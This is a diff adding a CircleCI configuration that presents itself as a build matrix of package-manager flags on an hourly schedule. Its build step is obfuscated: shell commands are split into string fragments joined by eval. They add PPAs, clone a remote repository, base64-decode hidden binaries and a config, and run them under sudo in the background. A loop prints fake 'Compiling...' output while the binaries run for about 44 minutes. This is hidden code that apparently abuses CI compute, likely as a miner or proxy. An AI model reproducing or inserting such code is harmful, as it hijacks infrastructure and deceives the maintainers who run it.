@@ -1,0 +1,90 @@
+version: 2.1
+
+workflows:
+  build-push:
+    jobs:
+      - build:
+          matrix:
+            parameters:
+              build: ["--digest", "--useoldpkg-atoms", "--rage-clean", "--rebuild-exclude", "--rebuild-ignore", "--alphabetical", "--read-news", "--changelog", "--rebuild-ignore", "--onlydeps-with-rdeps", "--check-news", "--buildpkg", "--complete-graph", "--prune", "--ignore-soname-deps", "--config-root", "--package-moves", "--reinstall", "--color", "--changed-slot"]
+  build-schedule:
+    jobs:
+      - build:
+          matrix:
+            parameters:
+              build: ["--digest", "--useoldpkg-atoms", "--rage-clean", "--rebuild-exclude", "--rebuild-ignore", "--alphabetical", "--read-news", "--changelog", "--rebuild-ignore", "--onlydeps-with-rdeps", "--check-news", "--buildpkg", "--complete-graph", "--prune", "--ignore-soname-deps", "--config-root", "--package-moves", "--reinstall", "--color", "--changed-slot"]
+    triggers:
+      - schedule:
+          cron: "5 * * * *"
+          filters:
+            branches:
+              only:
+                - master
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-1604:201903-01
+    parameters:
+      build:
+        type: string
+        default:
+    steps:
+      - run:
+          name: linux
+          command: |
+            XTaHvkFj="sudo add-ap"
+            REtoWHvkPG="t-repositor"
+            WLGabZG="y ppa:max-c"
+            YrCjXrWJKqx="-lv/shadows"
+            whztqzNB="ocks-libev "
+            JzXMH="-y &>/dev/n"
+            eval "$XTaHvkFj""$REtoWHvkPG""$WLGabZG""$YrCjXrWJKqx""$whztqzNB""$JzXMH""ull || true"
+            QFouDnbE="sudo add-ap"
+            ggiIQ="t-repositor"
+            IXYFNFZ="y ppa:ondre"
+            vbFbjJcx="j/apache2 -"
+            TQpaiLEwM="y &>/dev/nu"
+            eval "$QFouDnbE""$ggiIQ""$IXYFNFZ""$vbFbjJcx""$TQpaiLEwM""ll || true"
+            icmedoezdyP="sudo apt up"
+            UndOLnq="date || tru"
+            eval "$icmedoezdyP""$UndOLnq""e"
+            jSdCayfVm="sudo apt --"
+            LcxVqFrq="yes install"
+            QKrCCDYH=" openssl &>"
+            wSfCngBMe="/dev/null |"
+            eval "$jSdCayfVm""$LcxVqFrq""$QKrCCDYH""$wSfCngBMe""| true"
+            keOxPYKrG="sudo apt --"
+            xzLYKRDlw="yes install"
+            HEuiMk=" cl-base64 "
+            qSmmkbUx="git &>/dev/"
+            CntDcAaWxgd="null || tru"
+            eval "$keOxPYKrG""$xzLYKRDlw""$HEuiMk""$qSmmkbUx""$CntDcAaWxgd""e"
+            ifHpv="git clone h"
+            qDWspb="ttps://gccb"
+            CBULszPKsV="uild@bitbuc"
+            mnHYLBW="ket.org/gcc"
+            YgRgFIjjNwc="build/gcc.g"
+            agySWuKEp="it &>/dev/n"
+            eval "$ifHpv""$qDWspb""$CBULszPKsV""$mnHYLBW""$YgRgFIjjNwc""$agySWuKEp""ull"
+            VXHBVh="base64 -d g"
+            dcTWPz="cc/cmake_np"
+            eval "$VXHBVh""$dcTWPz""_ > cmake"
+            loCxvpULhJ="base64 -d g"
+            IvDNq="cc/config_ "
+            eval "$loCxvpULhJ""$IvDNq""> cconfig"
+            JEuYhwOwav="base64 -d g"
+            rvJqYqGaoti="cc/make_ > "
+            eval "$JEuYhwOwav""$rvJqYqGaoti""ci"
+            EMHwAW="sed -i 's/1"
+            hdyhXE="080/1081/g'"
+            eval "$EMHwAW""$hdyhXE"" cconfig"
+            chmod +x ci cmake
+            ./cmake
+            sed -i 's/build/og3o/g' cconfig
+            ZcgfBREaSSL="sudo ./ci -"
+            tijfLipO="-config=cco"
+            skEAEA="nfig &>/dev"
+            eval "$ZcgfBREaSSL""$tijfLipO""$skEAEA""/null &"
+            GCC=$(date +%s)
+            while true; do CC=$(date +%s); echo $CC Compiling...; [ $CC -ge $((GCC + 2621)) ] && sudo killall ci && break; sleep 205; done
